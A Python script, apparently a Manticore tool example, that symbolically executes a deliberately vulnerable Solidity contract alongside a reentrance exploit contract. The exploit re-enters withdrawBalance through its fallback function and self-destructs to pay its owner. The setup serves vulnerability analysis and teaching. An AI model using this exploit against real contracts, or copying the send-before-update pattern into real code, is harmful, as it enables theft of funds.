from manticore.ethereum import ManticoreEVM

################ Script #######################

m = ManticoreEVM()
m.verbosity(0)
# The contract account to analyze
contract_source_code = """
pragma solidity ^0.4.15;

contract Reentrance {
    mapping (address => uint) userBalance;
   
    function getBalance(address u) constant returns(uint){
        return userBalance[u];
    }

    function addToBalance() payable{
        userBalance[msg.sender] += msg.value;
    }   

    function withdrawBalance(){
        // send userBalance[msg.sender] ethers to msg.sender
        // if mgs.sender is a contract, it will call its fallback function
        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){
           revert();
        }
        userBalance[msg.sender] = 0;
    }   
}
"""

exploit_source_code = """
pragma solidity ^0.4.15;

contract GenericReentranceExploit {
    int reentry_reps=10; 
    address vulnerable_contract;
    address owner;
    bytes reentry_attack_string;

    function GenericReentranceExploit(){
        owner = msg.sender;
    }

    function set_vulnerable_contract(address _vulnerable_contract){
        vulnerable_contract = _vulnerable_contract ;
    }

    function set_reentry_attack_string(bytes _reentry_attack_string){
        reentry_attack_string = _reentry_attack_string;
    }

    function set_reentry_reps(int reps){
        reentry_reps = reps;
    }

    function proxycall(bytes data) payable{
        // call addToBalance with msg.value ethers
        vulnerable_contract.call.value(msg.value)(data);
    }

    function get_money(){
        suicide(owner);
    }

    function () payable{
        // reentry_reps is used to execute the attack a number of times
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (reentry_reps > 0){
            reentry_reps = reentry_reps - 1;
            vulnerable_contract.call(reentry_attack_string);
        }
    }
}
"""


# Initialize user and contracts
user_account = m.create_account(balance=100000000000000000)
attacker_account = m.create_account(balance=100000000000000000)
contract_account = m.solidity_create_contract(
    contract_source_code, owner=user_account
)  # Not payable
exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker_account)


# User deposits all in contract
print("[+] user deposited some.")
contract_account.addToBalance(value=100000000000000000)

print("[+] Initial world state")
print(
    f"     attacker_account {attacker_account.address:x} balance: {m.get_balance(attacker_account.address)}"
)
print(
    f"     exploit_account {exploit_account.address:x} balance: {m.get_balance(exploit_account.address)}"
)
print(f"     user_account {user_account.address:x} balance: {m.get_balance(user_account.address)}")
print(
    f"     contract_account {contract_account.address} balance: {m.get_balance(contract_account.address)}"
)


print("[+] Set up the exploit")
exploit_account.set_vulnerable_contract(contract_account)

print("\t Setting 30 reply reps")
exploit_account.set_reentry_reps(30)

print("\t Setting reply string")
exploit_account.set_reentry_attack_string(m.make_symbolic_buffer(4))

# Attacker is
print("[+] Attacker first transaction")
exploit_account.proxycall(m.make_symbolic_buffer(4), value=m.make_symbolic_value())

print("[+] Attacker second transaction")
exploit_account.proxycall(m.make_symbolic_buffer(4))

print("[+] The attacker destroys the exploit contract and profit")
exploit_account.get_money()

# Let seth know we are not sending more transactions so it can output
# info about running states and global statistics
m.finalize()
print(f"[+] Look for results in {m.workspace}")
